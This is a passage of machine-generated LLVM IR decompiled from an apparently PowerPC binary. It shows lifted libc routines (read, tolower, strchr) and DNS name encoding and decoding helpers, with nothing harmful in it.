  uselistorder i32 -2, { 8, 9, 10, 1, 0, 2, 7, 3, 4, 11, 12, 5, 13, 14, 15, 17, 18, 16, 19, 6 }
  uselistorder i32 31, { 22, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 23, 24, 1, 2, 3, 20, 21, 25, 26, 27, 41, 42, 4, 5, 0, 6, 28, 29, 30, 45, 46, 43, 44, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 19, 7, 8 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_1000aad4, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000ab00 = call i32 @__asm_mfcr()
  %v1_1000ab04 = and i32 %v0_1000ab00, 268435456
  %v3_1000ab04 = icmp eq i32 %v1_1000ab04, 0
  store i32 %v0_1000ab00, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ab04, label %dec_label_pc_1000ab1c, label %dec_label_pc_1000ab10

dec_label_pc_1000ab10:                            ; preds = %entry
  %v0_1000ab10 = call i32 @__errno_location()
  %v0_1000ab14 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ab14 = inttoptr i32 %v0_1000ab10 to i32*
  store i32 %v0_1000ab14, i32* %v2_1000ab14, align 4
  br label %dec_label_pc_1000ab1c

dec_label_pc_1000ab1c:                            ; preds = %entry, %dec_label_pc_1000ab10
  %v0_1000ab2c = phi i32 [ %v0_1000ab00, %entry ], [ -1, %dec_label_pc_1000ab10 ]
  ret i32 %v0_1000ab2c

; uselistorder directives
  uselistorder i32 ()* @__errno_location, { 45, 33, 44, 63, 62, 61, 43, 42, 32, 31, 41, 20, 19, 25, 38, 30, 29, 24, 18, 17, 15, 23, 14, 13, 12, 11, 10, 9, 8, 4, 37, 5, 7, 6, 50, 49, 60, 59, 58, 35, 34, 3, 2, 28, 27, 26, 0, 40, 39, 16, 48, 47, 22, 57, 21, 56, 55, 46, 36, 1, 54, 53, 52, 51 }
  uselistorder i32 268435456, { 5, 10, 6, 15, 11, 16, 18, 12, 19, 20, 21, 22, 23, 24, 25, 26, 8, 7, 17, 2, 3, 13, 0, 14, 1, 4, 9, 27 }
  uselistorder label %dec_label_pc_1000ab1c, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1000ab30 = add i32 %arg1, 128
  %v1_1000ab34 = mul i32 %arg1, 2
  %v2_1000ab38 = icmp ugt i32 %v1_1000ab30, 383
  %v0_1000ab3c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000ab38, i32 %v0_1000ab3c)
  %v3_1000ab44 = load i32, i32* bitcast (i32** @global_var_1001d820.381 to i32*), align 4
  %v2_1000ab48 = add i32 %v1_1000ab34, %v3_1000ab44
  %v3_1000ab48 = inttoptr i32 %v2_1000ab48 to i16*
  %v4_1000ab48 = load i16, i16* %v3_1000ab48, align 2
  %v5_1000ab48 = sext i16 %v4_1000ab48 to i32
  ret i32 %v5_1000ab48

; uselistorder directives
  uselistorder i32 128, { 10, 0, 1, 3, 20, 21, 5, 7, 11, 6, 12, 13, 14, 4, 15, 8, 16, 17, 18, 2, 9, 19 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000ab50 = urem i32 %arg1, 256
  store i32 %v1_1000ab50, i32* %r4.global-to-local, align 4
  %v0_1000ab702 = load i32, i32* @r3, align 4
  %v1_1000ab703 = urem i32 %v0_1000ab702, 4
  %v3_1000ab705 = icmp eq i32 %v1_1000ab703, 0
  br i1 %v3_1000ab705, label %dec_label_pc_1000ab78, label %dec_label_pc_1000ab58

dec_label_pc_1000ab58:                            ; preds = %entry, %dec_label_pc_1000ab6c
  %v1_1000ab5c = phi i32 [ %v0_1000ab78.pre, %dec_label_pc_1000ab6c ], [ %v1_1000ab50, %entry ]
  %v0_1000ab58 = phi i32 [ %v1_1000ab6c, %dec_label_pc_1000ab6c ], [ %v0_1000ab702, %entry ]
  %v1_1000ab58 = inttoptr i32 %v0_1000ab58 to i8*
  %v2_1000ab58 = load i8, i8* %v1_1000ab58, align 1
  %v3_1000ab58 = zext i8 %v2_1000ab58 to i32
  %v4_1000ab5c = icmp eq i32 %v3_1000ab58, %v1_1000ab5c
  %v3_1000ab60 = icmp eq i8 %v2_1000ab58, 0
  %v0_1000ab64 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000ab5c, i32 %v0_1000ab64)
  br i1 %v3_1000ab60, label %dec_label_pc_1000ac48, label %dec_label_pc_1000ab6c

dec_label_pc_1000ab6c:                            ; preds = %dec_label_pc_1000ab58
  %v0_1000ab6c = load i32, i32* @r3, align 4
  %v1_1000ab6c = add i32 %v0_1000ab6c, 1
  store i32 %v1_1000ab6c, i32* @r3, align 4
  %v1_1000ab70 = urem i32 %v1_1000ab6c, 4
  %v3_1000ab70 = icmp eq i32 %v1_1000ab70, 0
  %v0_1000ab78.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000ab70, label %dec_label_pc_1000ab78, label %dec_label_pc_1000ab58

dec_label_pc_1000ab78:                            ; preds = %dec_label_pc_1000ab6c, %entry
  %v0_1000ab9010 = phi i32 [ %v0_1000ab702, %entry ], [ %v1_1000ab6c, %dec_label_pc_1000ab6c ]
  %v0_1000ab78 = phi i32 [ %v1_1000ab50, %entry ], [ %v0_1000ab78.pre, %dec_label_pc_1000ab6c ]
  %v1_1000ab78 = mul i32 %v0_1000ab78, 256
  %v2_1000ab80 = or i32 %v1_1000ab78, %v0_1000ab78
  %v1_1000ab88 = mul i32 %v2_1000ab80, 65536
  %v2_1000ab8c = or i32 %v1_1000ab88, %v2_1000ab80
  br label %dec_label_pc_1000ab90

dec_label_pc_1000ab90:                            ; preds = %dec_label_pc_1000ab90, %dec_label_pc_1000ac44, %dec_label_pc_1000ab78
  %v0_1000abe8 = phi i32 [ %v0_1000ab9010, %dec_label_pc_1000ab78 ], [ %v1_1000ab94, %dec_label_pc_1000ac44 ], [ %v1_1000ab94, %dec_label_pc_1000ab90 ]
  %v1_1000ab90 = inttoptr i32 %v0_1000abe8 to i32*
  %v2_1000ab90 = load i32, i32* %v1_1000ab90, align 4
  %v1_1000ab94 = add i32 %v0_1000abe8, 4
  %v2_1000ab9c = xor i32 %v2_1000ab90, %v2_1000ab8c
  %v1_1000aba8 = add i32 %v2_1000ab90, 2130640639
  %v1_1000abac = add i32 %v2_1000ab9c, 2130640639
  %v2_1000abb0 = xor i32 %v1_1000aba8, %v2_1000ab90
  %v2_1000abb4 = xor i32 %v1_1000abac, %v2_1000ab9c
  %v2_1000abb8 = and i32 %v2_1000abb0, -2130640640
  %v3_1000abb8 = xor i32 %v2_1000abb8, -2130640640
  %v2_1000abbc = and i32 %v2_1000abb4, -2130640640
  %v3_1000abbc = xor i32 %v2_1000abbc, -2130640640
  %tmp = or i32 %v3_1000abbc, %v3_1000abb8
  %tmp16 = icmp eq i32 %tmp, 0
  br i1 %tmp16, label %dec_label_pc_1000ab90, label %dec_label_pc_1000abcc

dec_label_pc_1000abcc:                            ; preds = %dec_label_pc_1000ab90
  %v2_1000abcc = inttoptr i32 %v0_1000abe8 to i8*
  %v3_1000abcc = load i8, i8* %v2_1000abcc, align 1
  %v4_1000abcc = zext i8 %v3_1000abcc to i32
  %v1_1000abd0 = add i32 %v0_1000abe8, 1
  %v1_1000abd4 = add i32 %v0_1000abe8, 2
  %v1_1000abd8 = add i32 %v0_1000abe8, 3
  %v4_1000abdc = icmp eq i32 %v4_1000abcc, %v0_1000ab78
  br i1 %v4_1000abdc, label %dec_label_pc_1000abe8, label %dec_label_pc_1000abf0

dec_label_pc_1000abe8:                            ; preds = %dec_label_pc_1000abcc
  ret i32 %v0_1000abe8

dec_label_pc_1000abf0:                            ; preds = %dec_label_pc_1000abcc
  %v3_1000abe0 = icmp eq i8 %v3_1000abcc, 0
  br i1 %v3_1000abe0, label %dec_label_pc_1000ac48, label %dec_label_pc_1000abf4

dec_label_pc_1000abf4:                            ; preds = %dec_label_pc_1000abf0
  %v2_1000abf4 = inttoptr i32 %v1_1000abd0 to i8*
  %v3_1000abf4 = load i8, i8* %v2_1000abf4, align 1
  %v4_1000abf4 = zext i8 %v3_1000abf4 to i32
  %v4_1000abf8 = icmp eq i32 %v4_1000abf4, %v0_1000ab78
  br i1 %v4_1000abf8, label %dec_label_pc_1000ac04, label %dec_label_pc_1000ac0c

dec_label_pc_1000ac04:                            ; preds = %dec_label_pc_1000abf4
  ret i32 %v1_1000abd0

dec_label_pc_1000ac0c:                            ; preds = %dec_label_pc_1000abf4
  %v3_1000abfc = icmp eq i8 %v3_1000abf4, 0
  br i1 %v3_1000abfc, label %dec_label_pc_1000ac48, label %dec_label_pc_1000ac10

dec_label_pc_1000ac10:                            ; preds = %dec_label_pc_1000ac0c
  %v2_1000ac10 = inttoptr i32 %v1_1000abd4 to i8*
  %v3_1000ac10 = load i8, i8* %v2_1000ac10, align 1
  %v4_1000ac10 = zext i8 %v3_1000ac10 to i32
  %v4_1000ac14 = icmp eq i32 %v4_1000ac10, %v0_1000ab78
  br i1 %v4_1000ac14, label %dec_label_pc_1000ac20, label %dec_label_pc_1000ac28

dec_label_pc_1000ac20:                            ; preds = %dec_label_pc_1000ac10
  ret i32 %v1_1000abd4

dec_label_pc_1000ac28:                            ; preds = %dec_label_pc_1000ac10
  %v3_1000ac18 = icmp eq i8 %v3_1000ac10, 0
  br i1 %v3_1000ac18, label %dec_label_pc_1000ac48, label %dec_label_pc_1000ac2c

dec_label_pc_1000ac2c:                            ; preds = %dec_label_pc_1000ac28
  %v2_1000ac2c = inttoptr i32 %v1_1000abd8 to i8*
  %v3_1000ac2c = load i8, i8* %v2_1000ac2c, align 1
  %v4_1000ac2c = zext i8 %v3_1000ac2c to i32
  %v4_1000ac30 = icmp eq i32 %v4_1000ac2c, %v0_1000ab78
  br i1 %v4_1000ac30, label %dec_label_pc_1000ac3c, label %dec_label_pc_1000ac44

dec_label_pc_1000ac3c:                            ; preds = %dec_label_pc_1000ac2c
  ret i32 %v1_1000abd8

dec_label_pc_1000ac44:                            ; preds = %dec_label_pc_1000ac2c
  %v3_1000ac34 = icmp eq i8 %v3_1000ac2c, 0
  br i1 %v3_1000ac34, label %dec_label_pc_1000ac48, label %dec_label_pc_1000ab90

dec_label_pc_1000ac48:                            ; preds = %dec_label_pc_1000ab58, %dec_label_pc_1000ac44, %dec_label_pc_1000ac28, %dec_label_pc_1000ac0c, %dec_label_pc_1000abf0
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000ab94, { 1, 0 }
  uselistorder i32 %v2_1000ab90, { 0, 2, 1 }
  uselistorder i32 %v0_1000abe8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v2_1000ab80, { 1, 0 }
  uselistorder i32 %v0_1000ab78, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000ab6c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000ab702, { 2, 1, 0 }
  uselistorder i32 %v1_1000ab50, { 1, 2, 0 }
  uselistorder i32 3, { 1, 30, 31, 32, 33, 34, 35, 36, 15, 37, 2, 46, 3, 0, 8, 16, 27, 56, 55, 18, 17, 10, 19, 39, 9, 42, 4, 43, 44, 47, 48, 20, 49, 50, 5, 12, 21, 22, 23, 24, 25, 28, 29, 40, 41, 14, 6, 7, 45, 51, 52, 61, 62, 63, 57, 58, 59, 60, 11, 54, 53, 38, 26, 13 }
  uselistorder i32 -2130640640, { 3, 4, 5, 6, 0, 7, 2, 9, 1, 8, 10 }
  uselistorder i32 65536, { 0, 1, 10, 2, 3, 4, 5, 7, 6, 8, 11, 9 }
  uselistorder i32 4, { 153, 4, 5, 6, 97, 114, 7, 8, 156, 154, 155, 118, 157, 158, 159, 110, 9, 160, 161, 162, 163, 164, 165, 166, 10, 167, 11, 12, 13, 115, 168, 169, 119, 171, 170, 14, 15, 111, 137, 16, 17, 208, 209, 210, 211, 212, 213, 172, 120, 18, 19, 20, 246, 21, 247, 248, 121, 22, 23, 102, 24, 25, 26, 27, 28, 29, 180, 181, 122, 30, 31, 2, 32, 0, 214, 3, 33, 1, 188, 123, 34, 175, 176, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 249, 227, 103, 263, 270, 35, 36, 37, 38, 39, 250, 251, 40, 252, 41, 253, 42, 43, 131, 44, 45, 132, 46, 138, 139, 140, 148, 149, 150, 47, 133, 48, 49, 50, 134, 51, 135, 136, 191, 193, 192, 189, 190, 141, 142, 143, 144, 182, 183, 184, 185, 194, 195, 196, 186, 187, 117, 197, 124, 198, 199, 104, 52, 53, 200, 54, 201, 202, 203, 204, 205, 206, 112, 55, 207, 254, 255, 228, 56, 57, 58, 113, 59, 116, 229, 60, 61, 264, 265, 266, 125, 267, 268, 269, 62, 256, 257, 258, 100, 101, 259, 260, 126, 261, 262, 63, 64, 65, 66, 67, 68, 69, 70, 230, 71, 231, 232, 72, 233, 234, 235, 236, 237, 73, 74, 238, 239, 75, 240, 241, 76, 242, 243, 245, 77, 78, 98, 99, 244, 177, 79, 178, 127, 179, 173, 174, 128, 80, 81, 145, 82, 83, 84, 85, 86, 105, 87, 88, 89, 129, 90, 91, 106, 107, 146, 92, 147, 108, 93, 151, 109, 94, 152, 95, 96, 130 }
  uselistorder i32 256, { 0, 1, 2, 3, 4, 5, 40, 44, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 39, 18, 19, 20, 21, 22, 23, 24, 25, 47, 26, 48, 49, 50, 27, 28, 29, 30, 31, 46, 41, 45, 32, 33, 34, 35, 36, 37, 38, 42, 43 }
  uselistorder label %dec_label_pc_1000ac48, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000ab90, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ab58, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000ac54 = load i32, i32* @lr, align 4
  store i32 %v0_1000ac54, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1000ac60 = load i32, i32* @r4, align 4
  store i32 %v0_1000ac60, i32* @r29, align 4
  %v0_1000ac64 = load i32, i32* @r5, align 4
  store i32 %v0_1000ac64, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_1000acd013 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_1000acd013, label %dec_label_pc_1000acec, label %dec_label_pc_1000ace0

dec_label_pc_1000ac74:                            ; preds = %dec_label_pc_1000ace0
  store i32 268479608, i32* @lr, align 4
  %v3_1000ac74 = call i32 @__GI_strchr(i32 %v0_1000ace014, i32 46)
  store i32 %v3_1000ac74, i32* @r30, align 4
  %v3_1000ac78 = icmp eq i32 %v3_1000ac74, 0
  %v0_1000ac7c = load i32, i32* @r31, align 4
  store i32 %v0_1000ac7c, i32* @r3, align 4
  %v2_1000ac80 = sub i32 %v3_1000ac74, %v0_1000ac7c
  store i32 %v2_1000ac80, i32* %r0.global-to-local, align 4
  br i1 %v3_1000ac78, label %dec_label_pc_1000ac88, label %dec_label_pc_1000ac90

dec_label_pc_1000ac88:                            ; preds = %dec_label_pc_1000ac74
  %v0_1000ac88 = call i32 @__GI_strlen()
  store i32 %v0_1000ac88, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_1000ac88, 16777216
  %v1_1000ac8c = sdiv i32 %sext, 16777216
  store i32 %v1_1000ac8c, i32* %r0.global-to-local, align 4
  %v0_1000aca0.pre = load i32, i32* @r31, align 4
  %v0_1000acb0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000ac90

dec_label_pc_1000ac90:                            ; preds = %dec_label_pc_1000ac74, %dec_label_pc_1000ac88
  %v0_1000acb0 = phi i32 [ %v3_1000ac74, %dec_label_pc_1000ac74 ], [ %v0_1000acb0.pre, %dec_label_pc_1000ac88 ]
  %v0_1000aca0 = phi i32 [ %v0_1000ac7c, %dec_label_pc_1000ac74 ], [ %v0_1000aca0.pre, %dec_label_pc_1000ac88 ]
  %v0_1000acbc = phi i32 [ %v2_1000ac80, %dec_label_pc_1000ac74 ], [ %v1_1000ac8c, %dec_label_pc_1000ac88 ]
  %v0_1000ac90 = load i32, i32* @r28, align 4
  %v1_1000ac90 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000ac90 = sub i32 %v1_1000ac90, %v0_1000ac90
  %v1_1000ac98 = add i32 %v0_1000ac90, 1
  store i32 %v1_1000ac98, i32* %r11.global-to-local, align 4
  %v1_1000ac9c = add i32 %v2_1000ac90, -1
  store i32 %v0_1000aca0, i32* @r4, align 4
  %v0_1000aca4 = load i32, i32* @r29, align 4
  %v2_1000aca4 = add i32 %v0_1000aca4, %v1_1000ac98
  store i32 %v2_1000aca4, i32* @r3, align 4
  store i32 %v0_1000acbc, i32* @r5, align 4
  %v2_1000acac = icmp ult i32 %v0_1000acbc, %v1_1000ac9c
  %v1_1000acb0 = add i32 %v0_1000acb0, 1
  store i32 %v1_1000acb0, i32* @r31, align 4
  %v3_1000ac94.not = icmp ne i32 %v0_1000acbc, 0
  %or.cond = and i1 %v2_1000acac, %v3_1000ac94.not
  br i1 %or.cond, label %dec_label_pc_1000acbc, label %dec_label_pc_1000ad04

dec_label_pc_1000acbc:                            ; preds = %dec_label_pc_1000ac90
  %v3_1000acbc = trunc i32 %v0_1000acbc to i8
  %v4_1000acbc = add i32 %v0_1000aca4, %v0_1000ac90
  %v5_1000acbc = inttoptr i32 %v4_1000acbc to i8*
  store i8 %v3_1000acbc, i8* %v5_1000acbc, align 1
  %v0_1000acc0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000acc0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000acc0 = add i32 %v1_1000acc0, %v0_1000acc0
  store i32 %v2_1000acc0, i32* @r28, align 4
  store i32 268479688, i32* @lr, align 4
  %v0_1000acc4 = call i32 @memcpy()
  store i32 %v0_1000acc4, i32* %r3.global-to-local, align 4
  %v0_1000acc8 = load i32, i32* @r30, align 4
  %v3_1000acc8 = icmp eq i32 %v0_1000acc8, 0
  br i1 %v3_1000acc8, label %dec_label_pc_1000acec, label %dec_label_pc_1000acbc.dec_label_pc_1000acd0_crit_edge

dec_label_pc_1000acbc.dec_label_pc_1000acd0_crit_edge: ; preds = %dec_label_pc_1000acbc
  %v0_1000acd0.pre = load i32, i32* @r31, align 4
  %v3_1000acd0 = icmp eq i32 %v0_1000acd0.pre, 0
  store i32 %v0_1000acd0.pre, i32* @r3, align 4
  br i1 %v3_1000acd0, label %dec_label_pc_1000acec, label %dec_label_pc_1000ace0

dec_label_pc_1000ace0:                            ; preds = %entry, %dec_label_pc_1000acbc.dec_label_pc_1000acd0_crit_edge
  %v0_1000ace014 = phi i32 [ %v0_1000acd0.pre, %dec_label_pc_1000acbc.dec_label_pc_1000acd0_crit_edge ], [ %tmp, %entry ]
  %v1_1000ace0 = inttoptr i32 %v0_1000ace014 to i8*
  %v2_1000ace0 = load i8, i8* %v1_1000ace0, align 1
  %v3_1000ace0 = zext i8 %v2_1000ace0 to i32
  store i32 %v3_1000ace0, i32* %r0.global-to-local, align 4
  %v3_1000ace4 = icmp eq i8 %v2_1000ace0, 0
  br i1 %v3_1000ace4, label %dec_label_pc_1000acec, label %dec_label_pc_1000ac74

dec_label_pc_1000acec:                            ; preds = %dec_label_pc_1000acbc.dec_label_pc_1000acd0_crit_edge, %dec_label_pc_1000acbc, %dec_label_pc_1000ace0, %entry
  %v0_1000acec = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_1000acec, 1
  br i1 %tmp10, label %dec_label_pc_1000ad04, label %dec_label_pc_1000acf4

dec_label_pc_1000acf4:                            ; preds = %dec_label_pc_1000acec
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000acf8 = load i32, i32* @r28, align 4
  %v1_1000acf8 = add i32 %v0_1000acf8, 1
  store i32 %v1_1000acf8, i32* %r3.global-to-local, align 4
  %v1_1000acfc = load i32, i32* @r29, align 4
  %v4_1000acfc = add i32 %v1_1000acfc, %v0_1000acf8
  %v5_1000acfc = inttoptr i32 %v4_1000acfc to i8*
  store i8 0, i8* %v5_1000acfc, align 1
  %v0_1000ad18.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ad08

dec_label_pc_1000ad04:                            ; preds = %dec_label_pc_1000ac90, %dec_label_pc_1000acec
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ad08

dec_label_pc_1000ad08:                            ; preds = %dec_label_pc_1000acf4, %dec_label_pc_1000ad04
  %v0_1000ad18 = phi i32 [ %v0_1000ad18.pre, %dec_label_pc_1000acf4 ], [ -1, %dec_label_pc_1000ad04 ]
  store i32 %v0_1000ac54, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000ad18

; uselistorder directives
  uselistorder i32 %v0_1000ace014, { 1, 0 }
  uselistorder i32 %v0_1000acd0.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1000acbc, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000ac8c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 16777216, { 1, 0, 2 }
  uselistorder i32 ()* @__GI_strlen, { 18, 39, 38, 17, 16, 15, 14, 12, 40, 37, 0, 36, 1, 35, 34, 33, 32, 5, 4, 31, 30, 29, 3, 2, 28, 27, 26, 10, 25, 9, 24, 23, 8, 22, 7, 13, 6, 21, 19, 20, 11 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0 }
  uselistorder i32 46, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_1000ad08, { 1, 0 }
  uselistorder label %dec_label_pc_1000ad04, { 1, 0 }
  uselistorder label %dec_label_pc_1000acec, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000ace0, { 1, 0 }
  uselistorder label %dec_label_pc_1000ac90, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %v0_1000ad20 = call i32 @__asm_mfcr()
  store i32 %v0_1000ad20, i32* @r26, align 4
  %v3_1000ad2c = icmp eq i32 %v0_1000ad20, 0
  store i32 %arg2, i32* @r25, align 4
  %v0_1000ad3c = load i32, i32* @r6, align 4
  store i32 %v0_1000ad3c, i32* @r24, align 4
  br i1 %v3_1000ad2c, label %dec_label_pc_1000adf4, label %dec_label_pc_1000ad44

dec_label_pc_1000ad44:                            ; preds = %entry
  store i32 1, i32* @r23, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1000add014 = load i32, i32* @r4, align 4
  %v2_1000add015 = add i32 %v1_1000add014, %v0_1000ad20
  %v3_1000add016 = inttoptr i32 %v2_1000add015 to i8*
  %v4_1000add017 = load i8, i8* %v3_1000add016, align 1
  %v5_1000add018 = zext i8 %v4_1000add017 to i32
  store i32 %v5_1000add018, i32* @r31, align 4
  store i1 false, i1* @cr4_eq, align 1
  %v3_1000add820 = icmp eq i8 %v4_1000add017, 0
  br i1 %v3_1000add820, label %dec_label_pc_1000ade4, label %dec_label_pc_1000ad54

dec_label_pc_1000ad54:                            ; preds = %dec_label_pc_1000ad44, %dec_label_pc_1000adcc
  %v3_1000add422 = phi i1 [ %v3_1000add4, %dec_label_pc_1000adcc ], [ false, %dec_label_pc_1000ad44 ]
  %v5_1000add021 = phi i32 [ %v5_1000add0, %dec_label_pc_1000adcc ], [ %v5_1000add018, %dec_label_pc_1000ad44 ]
  br i1 %v3_1000add422, label %dec_label_pc_1000ad5c, label %dec_label_pc_1000ad58

dec_label_pc_1000ad58:                            ; preds = %dec_label_pc_1000ad54
  %v0_1000ad58 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000ad58 = add i32 %v0_1000ad58, 1
  store i32 %v1_1000ad58, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000ad5c

dec_label_pc_1000ad5c:                            ; preds = %dec_label_pc_1000ad54, %dec_label_pc_1000ad58
  %v1_1000ad5c = call i32 @__asm_rlwinm(i32 %v5_1000add021, i32 0, i32 24, i32 25)
  %v0_1000ad60 = load i32, i32* @r4, align 4
  %v1_1000ad60 = add i32 %v0_1000ad60, 1
  store i32 %v1_1000ad60, i32* @r30, align 4
  %v3_1000ad64 = icmp eq i32 %v1_1000ad5c, 192
  br i1 %v3_1000ad64, label %dec_label_pc_1000ad6c, label %dec_label_pc_1000ad8c

dec_label_pc_1000ad6c:                            ; preds = %dec_label_pc_1000ad5c
  %v0_1000ad6c = load i1, i1* @cr4_eq, align 1
  br i1 %v0_1000ad6c, label %dec_label_pc_1000ad74, label %dec_label_pc_1000ad70

dec_label_pc_1000ad70:                            ; preds = %dec_label_pc_1000ad6c
  %v0_1000ad70 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000ad70 = add i32 %v0_1000ad70, 1
  store i32 %v1_1000ad70, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000ad74

dec_label_pc_1000ad74:                            ; preds = %dec_label_pc_1000ad6c, %dec_label_pc_1000ad70
  %v0_1000ad74 = load i32, i32* @r26, align 4
  %v2_1000ad74 = add i32 %v0_1000ad74, %v1_1000ad60
  %v3_1000ad74 = inttoptr i32 %v2_1000ad74 to i8*
  %v4_1000ad74 = load i8, i8* %v3_1000ad74, align 1
  %v5_1000ad74 = zext i8 %v4_1000ad74 to i32
  %v1_1000ad78 = call i32 @__asm_rlwinm(i32 %v5_1000add021, i32 8, i32 18, i32 23)
  %v0_1000ad7c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000ad7c, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_1000ad84 = or i32 %v5_1000ad74, %v1_1000ad78
  store i32 %v2_1000ad84, i32* @r4, align 4
  br label %dec_label_pc_1000adcc

dec_label_pc_1000ad8c:                            ; preds = %dec_label_pc_1000ad5c
  %v0_1000ad8c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000ad8c = add i32 %v0_1000ad8c, %v5_1000add021
  store i32 %v2_1000ad8c, i32* @r29, align 4
  %v1_1000ad90 = add i32 %v2_1000ad8c, 1
  store i32 %v1_1000ad90, i32* @r28, align 4
  %v1_1000ad94 = load i32, i32* @r24, align 4
  %v2_1000ad94 = icmp ult i32 %v1_1000ad90, %v1_1000ad94
  br i1 %v2_1000ad94, label %dec_label_pc_1000ad9c, label %dec_label_pc_1000adf4

dec_label_pc_1000ad9c:                            ; preds = %dec_label_pc_1000ad8c
  %v0_1000ad9c = load i32, i32* @r26, align 4
  %v2_1000ad9c = add i32 %v0_1000ad9c, %v1_1000ad60
  store i32 %v2_1000ad9c, i32* @r4, align 4
  %v0_1000ada0 = load i32, i32* @r25, align 4
  %v2_1000ada0 = add i32 %v0_1000ada0, %v0_1000ad8c
  store i32 %v2_1000ada0, i32* @r3, align 4
  store i32 %v5_1000add021, i32* @r5, align 4
  store i32 268479916, i32* @lr, align 4
  %v0_1000ada8 = call i32 @memcpy()
  %v0_1000adac = load i32, i32* @r30, align 4
  %v2_1000adac = add i32 %v0_1000adac, %v5_1000add021
  store i32 %v2_1000adac, i32* @r4, align 4
  %v0_1000adb0 = load i1, i1* @cr4_eq, align 1
  br i1 %v0_1000adb0, label %dec_label_pc_1000adb8, label %dec_label_pc_1000adb4

dec_label_pc_1000adb4:                            ; preds = %dec_label_pc_1000ad9c
  %v0_1000adb4 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000adb4 = add i32 %v0_1000adb4, %v5_1000add021
  store i32 %v2_1000adb4, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000adb8

dec_label_pc_1000adb8:                            ; preds = %dec_label_pc_1000ad9c, %dec_label_pc_1000adb4
  %v0_1000adb8 = load i32, i32* @r26, align 4
  %v2_1000adb8 = add i32 %v0_1000adb8, %v2_1000adac
  %v3_1000adb8 = inttoptr i32 %v2_1000adb8 to i8*
  %v4_1000adb8 = load i8, i8* %v3_1000adb8, align 1
  %v3_1000adbc = icmp eq i8 %v4_1000adb8, 0
  br i1 %v3_1000adbc, label %dec_label_pc_1000adc8, label %dec_label_pc_1000adc4

dec_label_pc_1000adc4:                            ; preds = %dec_label_pc_1000adb8
  br label %dec_label_pc_1000adc8

dec_label_pc_1000adc8:                            ; preds = %dec_label_pc_1000adb8, %dec_label_pc_1000adc4
  %v0_1000adc8.off0 = phi i8 [ 0, %dec_label_pc_1000adb8 ], [ 46, %dec_label_pc_1000adc4 ]
  %v1_1000adc8 = load i32, i32* @r25, align 4
  %v2_1000adc8 = load i32, i32* @r29, align 4
  %v4_1000adc8 = add i32 %v2_1000adc8, %v1_1000adc8
  %v5_1000adc8 = inttoptr i32 %v4_1000adc8 to i8*
  store i8 %v0_1000adc8.off0, i8* %v5_1000adc8, align 1
  %v0_1000adcc.pre = load i32, i32* @r28, align 4
  %v0_1000add4.pre.pre = load i32, i32* @r23, align 4
  %v1_1000add0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000adcc

